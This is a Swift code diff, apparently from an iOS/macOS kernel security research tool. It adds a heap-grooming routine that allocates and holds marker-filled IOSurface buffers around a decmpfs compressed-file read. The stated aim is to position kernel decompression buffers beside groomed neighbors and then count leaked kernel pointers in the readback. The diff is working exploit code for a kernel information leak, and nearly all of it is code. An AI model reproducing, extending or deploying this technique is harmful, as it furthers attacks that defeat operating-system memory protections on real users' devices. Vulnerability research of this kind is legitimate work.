@@ -252,6 +252,50 @@ enum Runners {
         var note: String
     }
 
+    // GROOM (2026-11-07): kernel-side churn right before the under-produce
+    // read — IOSurface-backed buffer pressure (the p145-class law: real
+    // IOSurface allocs through the framework), marker-filled, HELD for the
+    // read. The kernel's decompression page buffers then get groomed
+    // neighbors. 8 held surfacess, 0x4000-class, released after the probe.
+    private static func groomSurfaces(_ n: Int, size: Int, marker: UInt8) -> Int {
+        guard let h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY) else {
+            return -1
+        }
+        typealias CreateFn = @convention(c) (CFDictionary?) -> UnsafeMutableRawPointer?
+        guard let p = dlsym(h, "IOSurfaceCreate") else { return -2 }
+        let create = unsafeBitCast(p, to: CreateFn.self)
+        var held = 0
+        var refs: [UnsafeMutableRawPointer?] = []
+        for _ in 0..<n {
+            var d = [String: Any]()
+            d["IOSurfaceWidth"] = 64
+            d["IOSurfaceHeight"] = 16
+            d["IOSurfaceBytesPerElement"] = 4
+            d["IOSurfaceBytesPerRow"] = max(256, size / 16)
+            d["IOSurfaceAllocSize"] = size
+            var surf: UnsafeMutableRawPointer? = nil
+            d.withDictionaryRepresentation { cd, _ in
+                if let cd = cd { surf = create(cd) }
+            }
+            if surf != nil { refs.append(surf); held += 1 }
+        }
+        // fill via IOSurfaceGetBaseAddress
+        typealias GetFn = @convention(c) (UnsafeMutableRawPointer?) -> UnsafeMutableRawPointer?
+        if let gp = dlsym(h, "IOSurfaceGetBaseAddress") {
+            let get = unsafeBitCast(gp, to: GetFn.self)
+            for s in refs {
+                if let b = get(s) {
+                    memset(b, Int32(marker), size)
+                }
+            }
+        }
+        // hold the refs until the read finishes: parked in a static
+        groomHold = refs
+        return held
+    }
+    private static var groomHold: [UnsafeMutableRawPointer?] = []
+    static func groomRelease() { groomHold.removeAll(); groomHold = [] }
+
     static func decmpfsProbe(at url: URL, uncompressed: Int, chunks: Int, producePerChunk: Int) -> DecmpfsResult {
         let fm = FileManager.default
         try? fm.removeItem(at: url)
@@ -269,7 +313,13 @@ enum Runners {
                                  note: tl("setxattr 失败 errno=") + "\(errno)")
         }
 
+        // THE GROOM: IOSurface pressure right before the read (marker 0x77)
+        var groomNote = ""
+        let g = groomSurfaces(8, size: 0x4000, marker: 0x77)
+        groomNote = g >= 0 ? " groom=\(g)x0x4000@0x77" : " groom=unavailable"
+
         guard let back = try? Data(contentsOf: url) else {
+            groomRelease()
             return DecmpfsResult(wroteXattr: true, readBack: 0, kernelPointerHits: 0, samples: [],
                                  note: tl("读取失败 errno=") + "\(errno)")
         }
@@ -290,8 +340,9 @@ enum Runners {
                 i += 8
             }
         }
+        groomRelease()
         return DecmpfsResult(wroteXattr: true, readBack: back.count, kernelPointerHits: hits,
-                             samples: samples, note: tl("读取 ") + "\(back.count)" + tl(" 字节"))
+                             samples: samples, note: tl("读取 ") + "\(back.count)" + tl(" 字节") + groomNote)
     }
 
     // ---- FontParser
